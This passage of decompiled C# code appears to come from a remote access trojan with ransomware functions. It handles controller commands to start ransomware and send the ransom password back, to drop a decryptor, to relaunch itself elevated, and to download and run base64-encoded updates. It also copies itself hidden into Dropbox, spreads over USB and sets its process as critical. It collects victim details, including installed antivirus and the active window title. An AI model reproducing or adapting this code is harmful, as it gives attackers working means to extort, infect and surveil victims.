					ransomWare = new RansomWare();
					goto IL_0a84;
					IL_0a84:
					num = 116;
					ransomWare.startAction();
					goto IL_0a90;
					IL_0a90:
					num = 117;
					BitcoinAddress = array[1];
					goto IL_0a9c;
					IL_0a9c:
					num = 118;
					C.Send("sendranspass" + Y + ransompassword);
					goto end_IL_0001_3;
					IL_0ac3:
					num = 120;
					if (Operators.CompareString(text, "stopransom", false) == 0)
					{
						goto IL_0ad9;
					}
					goto IL_0b2d;
					IL_0ad9:
					num = 121;
					File.WriteAllText(userDir + "\\" + userName + "\\Desktop\\DecryptKey.txt", array[1]);
					goto IL_0afe;
					IL_0afe:
					num = 122;
					File.WriteAllBytes(userDir + "\\" + userName + "\\Desktop\\BWORM Decryptor.exe", Convert.FromBase64String(array[2]));
					goto end_IL_0001_3;
					IL_0b2d:
					num = 124;
					if (Operators.CompareString(text, "elevate", false) == 0)
					{
						goto IL_0b43;
					}
					goto IL_0b64;
					IL_0b43:
					num = 125;
					RestartElevated();
					goto IL_0b4c;
					IL_0b4c:
					num = 126;
					C.Send("isElevated");
					goto end_IL_0001_3;
					IL_0b64:
					num = 128;
					if (Operators.CompareString(text, "Update", false) == 0)
					{
						goto IL_0b7d;
					}
					goto IL_0bd0;
					IL_0b7d:
					num = 129;
					File.WriteAllBytes(Path.GetTempPath() + array[1], Convert.FromBase64String(array[2]));
					goto IL_0b9e;
					IL_0b9e:
					num = 130;
					Thread.Sleep(1000);
					goto IL_0baf;
					IL_0baf:
					num = 131;
					Process.Start(Path.GetTempPath() + array[1]);
					ProjectData.EndApp();
					goto end_IL_0001_3;
					end_IL_0001_2:
					break;
				}
				num = 140;
				Application.Exit();
				ProjectData.EndApp();
				break;
				end_IL_0001:;
			}
			catch (object obj5) when (obj5 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj5);
				try0001_dispatch = 3729;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static void DropBoxSpreadFunc(string FileName)
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 142:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0026;
						case 4:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 5:
						case 6:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_0026:
					num = 3;
					File.Copy(Application.get_ExecutablePath(), "C:\\Users\\" + Environment.UserName + "\\Dropbox\\" + FileName);
					break;
					IL_0009:
					num = 2;
					if (!Directory.Exists("C:\\Users\\" + Environment.UserName + "\\Dropbox\\"))
					{
						goto end_IL_0001_3;
					}
					goto IL_0026;
					end_IL_0001_2:
					break;
				}
				num = 4;
				File.SetAttributes("C:\\Users\\" + Environment.UserName + "\\Dropbox\\" + FileName, FileAttributes.Hidden);
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 142;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private static void RestartElevated()
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.UseShellExecute = true;
		processStartInfo.WorkingDirectory = Environment.CurrentDirectory;
		processStartInfo.FileName = Application.get_ExecutablePath();
		processStartInfo.Verb = "runas";
		try
		{
			Process.Start(processStartInfo);
		}
		catch (Win32Exception projectError)
		{
			ProjectData.SetProjectError((Exception)projectError);
			ProjectData.ClearProjectError();
			return;
		}
		Application.Exit();
	}

	public static void UsbVicTim()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 298:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0021;
						case 4:
						case 5:
							goto IL_0037;
						case 6:
							goto IL_004a;
						case 7:
							goto IL_0065;
						case 9:
							goto IL_007e;
						case 10:
							goto IL_0081;
						case 11:
							goto IL_009d;
						case 8:
						case 12:
						case 13:
							goto IL_00b5;
						case 14:
							goto end_IL_0001_2;
						default:
							goto end_IL_0001;
						case 15:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00b5:
					num = 13;
					spread = File.ReadAllText(Path.GetTempPath() + "BlackData.dat");
					break;
					IL_009d:
					num = 11;
					File.SetAttributes(Path.GetTempPath() + "BlackData.dat", FileAttributes.Hidden);
					goto IL_00b5;
					IL_0009:
					num = 2;
					if (File.Exists(Path.GetTempPath() + "BlackData.dat"))
					{
						goto IL_0021;
					}
					goto IL_0037;
					IL_0021:
					num = 3;
					File.Delete(Path.GetTempPath() + "BlackData.dat");
					goto IL_0037;
					IL_0037:
					num = 5;
					if (Application.get_ExecutablePath().EndsWith(exen))
					{
						goto IL_004a;
					}
					goto IL_007e;
					IL_004a:
					num = 6;
					File.WriteAllText(Path.GetTempPath() + "BlackData.dat", "Yes");
					goto IL_0065;
					IL_0065:
					num = 7;
					File.SetAttributes(Path.GetTempPath() + "BlackData.dat", FileAttributes.Hidden);
					goto IL_00b5;
					IL_007e:
					num = 9;
					goto IL_0081;
					IL_0081:
					num = 10;
					File.WriteAllText(Path.GetTempPath() + "BlackData.dat", "No");
					goto IL_009d;
					end_IL_0001_2:
					break;
				}
				num = 14;
				Exta.filehide();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 298;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static string INF()
	{
		string text = ((!MySettingsProperty.Settings.TransferStatus) ? (Name + "_" + HWD() + Y) : (MySettingsProperty.Settings.ID + "_" + HWD() + Y));
		try
		{
			text = text + Environment.MachineName + Y;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			text = text + "??" + Y;
			ProjectData.ClearProjectError();
		}
		try
		{
			text = text + Environment.UserName + Y;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			text = text + "??" + Y;
			ProjectData.ClearProjectError();
		}
		text = text + Gcc() + Y;
		try
		{
			text += ((ServerComputer)F).get_Info().get_OSFullName().Replace("Microsoft", "")
				.Replace("Windows", "Win")
				.Replace("®", "")
				.Replace("™", "")
				.Replace("  ", " ")
				.Replace(" Win", "Win");
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			text += "??";
			ProjectData.ClearProjectError();
		}
		text += "SP";
		try
		{
			string[] array = Strings.Split(Environment.OSVersion.ServicePack, " ", -1, (CompareMethod)0);
			if (array.Length == 1)
			{
				text += "0";
			}
			text += array[checked(array.Length - 1)];
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			text += "0";
			ProjectData.ClearProjectError();
		}
		try
		{
			text = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86")) ? (text + " x86" + Y) : (text + " x64" + Y));
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			text += Y;
			ProjectData.ClearProjectError();
		}
		text = text + GetAntiVirus() + Y;
		text = text + Ver + Y;
		text = text + "" + Y;
		text = text + ACT() + Y;
		text = text + FR() + Y;
		return text + spread + Y;
	}

	public static string FR()
	{
		try
		{
			return ((FileInfo)LO).LastWriteTime.ToString("yyyy-MM-dd");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "unknown";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string GetAntiVirus()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Expected O, but got Unknown
		try
		{
			string text = null;
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val3).get_Item("displayName").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (Operators.CompareString(text, string.Empty, false) == 0)
			{
				text = "N/A";
			}
			text.ToString();
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "N/A";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static double GetSystemRAMSize()
	{
		double result = default(double);
		try
		{
			double num = (double)((ServerComputer)MyProject.Computer).get_Info().get_TotalPhysicalMemory() / 1024.0 / 1024.0 / 1024.0;
			result = Conversions.ToDouble(Strings.FormatNumber((object)num, 2, (TriState)(-2), (TriState)(-2), (TriState)(-2)));
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);

	public static string HWD()
	{
		try
		{
			string lpRootPathName = Interaction.Environ("SystemDrive") + "\\";
			string lpVolumeNameBuffer = null;
			int lpMaximumComponentLength = 0;
			int lpFileSystemFlags = 0;
			string lpFileSystemNameBuffer = null;
			int lpVolumeSerialNumber = default(int);
			GetVolumeInformationA(ref lpRootPathName, ref lpVolumeNameBuffer, 0, ref lpVolumeSerialNumber, ref lpMaximumComponentLength, ref lpFileSystemFlags, ref lpFileSystemNameBuffer, 0);
			return Conversion.Hex(lpVolumeSerialNumber);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "ERR";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowThreadProcessId(IntPtr hwnd, ref int lpdwProcessID);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetWindowTextA", ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextA_1(IntPtr hWnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string WinTitle, int MaxLength);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetWindowTextLengthA(long hwnd);

	public static string ACT()
	{
		checked
		{
			try
			{
				IntPtr foregroundWindow = GetForegroundWindow();
				if (foregroundWindow == IntPtr.Zero)
				{
					return "";
				}
				int windowTextLengthA = GetWindowTextLengthA((long)foregroundWindow);
				string WinTitle = Strings.StrDup(windowTextLengthA + 1, "*");
				GetWindowTextA_1(foregroundWindow, ref WinTitle, windowTextLengthA + 1);
				int lpdwProcessID = default(int);
				GetWindowThreadProcessId(foregroundWindow, ref lpdwProcessID);
				if (lpdwProcessID != 0)
				{
					try
					{
						return Process.GetProcessById(lpdwProcessID).MainWindowTitle;
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						string result = WinTitle;
						ProjectData.ClearProjectError();
						return result;
					}
				}
				return WinTitle;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				string result = "";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static string BS(byte[] b)
	{
		return Encoding.Default.GetString(b);
	}

	public static byte[] SB(string s)
	{
		return Encoding.Default.GetBytes(s);
	}

	public static Array fx(byte[] b, string WRD)
	{
		List<byte[]> list = new List<byte[]>();
		MemoryStream memoryStream = new MemoryStream();
		MemoryStream memoryStream2 = new MemoryStream();
		string[] array = Strings.Split(BS(b), WRD, -1, (CompareMethod)0);
		memoryStream.Write(b, 0, array[0].Length);
		checked
		{
			memoryStream2.Write(b, array[0].Length + WRD.Length, b.Length - (array[0].Length + WRD.Length));
			list.Add(memoryStream.ToArray());
			list.Add(memoryStream2.ToArray());
			memoryStream.Dispose();
			memoryStream2.Dispose();
			return list.ToArray();
		}
	}

	[DllImport("kernel32.dll")]
	private static extern int GetLocaleInfo(uint Locale, uint LCType, [Out] StringBuilder lpLCData, int cchData);

	public static string Gcc()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			int localeInfo = GetLocaleInfo(1024u, 7u, stringBuilder, stringBuilder.Capacity);
			if (localeInfo > 0)
			{
				return stringBuilder.ToString().Substring(0, checked(localeInfo - 1));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return "X";
	}

	[DllImport("ntdll")]
	public static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

	public static void pr(int i)
	{
		try
		{
			NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref i, 4);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void ED()
	{
		pr(0);
	}
}
